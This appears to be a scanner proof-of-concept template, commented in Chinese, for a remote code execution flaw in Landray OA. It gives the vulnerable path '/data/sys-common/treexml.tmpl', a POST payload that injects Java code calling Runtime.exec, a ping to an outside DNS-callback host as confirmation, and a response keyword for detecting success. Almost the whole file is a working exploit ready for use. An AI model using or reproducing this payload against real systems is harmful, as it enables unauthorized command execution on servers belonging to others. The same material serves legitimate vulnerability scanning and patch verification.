#poc名称
- name:
  - name: "LandrayOA_treexml_rce"

#请求方式
- method:
  - method: "post"

#payload
- payload:
  - payload: 's_bean=ruleFormulaValidate&script=try {String cmd = "ping cd1d5369.ipv6.1433.eu.org";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}'

#response包里的关键字
- word:
  - word:
      - "<success>"

#漏洞的位置
- url:
  - url : "/data/sys-common/treexml.tmpl"

#验证是否攻击成功的 请求方式
- method-V:
  - method: "isNone"

#webshell位置
- verify:
  - verify : "isNone"